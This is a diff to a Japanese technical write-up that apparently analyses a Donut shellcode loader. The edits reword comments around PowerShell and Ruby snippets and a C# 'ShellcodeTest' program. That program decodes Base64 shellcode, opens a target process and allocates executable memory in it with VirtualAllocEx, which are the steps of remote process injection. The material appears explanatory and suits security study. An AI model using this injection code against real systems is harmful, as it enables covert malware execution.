@@ -298,7 +298,7 @@ $base64 = $donutfile
 }
 }
 ```
-上のpowershellが読み込まれた後「Donut-Loader」関数を実行できる。引数のファイルはバイナリで読み込んだ後Base64に変換する
+上のpowershellが読み込まれた後「Donut-Loader」関数を実行できる。引数のファイルはバイナリで読み込んだ後Base64に変換され引数に渡される
 ```ruby
 pid = donut_Loader[2]
 load_executable = donut_Loader[4]
@@ -344,7 +344,7 @@ namespace ShellcodeTest
 			Process processById = Process.GetProcessById(procPID);
 			Console.WriteLine(processById.Id);
 			string text;
-			// WindowsAPIの「IsWow64Process」関数で、指定されたプロセスIDのプロセスがx64で実行されているか確認
+			// WindowsAPIの「IsWow64Process」関数で、指定されたプロセスIDのプロセスがWOW64またはx64プロセッサで実行されているか確認
 			if (Program.IsWow64Process(processById))
 			{
 				text = x86;
@@ -353,9 +353,10 @@ namespace ShellcodeTest
 			{
 				text = x64;
 			}
-			// System.Convert.FromBase64String()でバイト型配列に変換
+			// System.Convert.FromBase64String()でBase64から８ビット符号なし整数配列に変換
 			byte[] array = Convert.FromBase64String(text);
 			IntPtr intPtr = Program.OpenProcess(1082, false, processById.Id);
+			// checkedステートメントで整数型の算術演算および変換に対するオーバーフローをチェックする
 			checked
 			{
 				IntPtr intPtr2 = Program.VirtualAllocEx(intPtr, IntPtr.Zero, (uint)array.Length, 12288U, 64U);
